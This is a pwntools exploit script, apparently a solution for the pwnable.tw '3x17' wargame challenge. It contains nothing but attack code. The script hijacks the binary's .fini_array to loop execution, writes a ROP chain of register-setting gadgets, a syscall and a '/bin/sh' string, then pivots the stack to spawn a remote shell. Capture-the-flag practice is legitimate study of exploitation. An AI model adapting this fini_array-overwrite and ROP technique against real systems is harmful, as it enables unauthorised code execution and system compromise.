from pwn import *
elf = ELF("./3x17")
context.binary=elf
target=remote('chall.pwnable.tw', 10105)

def sla(string,val):
	target.sendlineafter(string,val)

def sa(string,val):
	target.sendafter(string,val)

def attack(addr,data):
	sa("addr:",str(addr))
	sa("data:",data)

finiarray=0x4b40f0
poprdi=0x0000000000401696
poprax=0x000000000041e4af
poprsi=0x0000000000406c30
poprdx=0x0000000000446e35
leave=0x0000000000401c4b
syscall=0x00000000004022b4
restart=0x401B6D
finicaller=0x402960
payload=p64(finicaller)+p64(restart)
attack(finiarray,payload)
payload=p64(0x3b)+p64(poprsi)+p64(0)
attack(finiarray+0x10,payload)
payload=p64(poprdx)+p64(0)+p64(poprdi)
attack(finiarray+0x28,payload)
payload=p64(finiarray+0x50)+p64(syscall)+"/bin/sh\x00"
attack(finiarray+0x40,payload)
payload=p64(leave)+p64(poprax)
attack(finiarray,payload)
target.interactive()
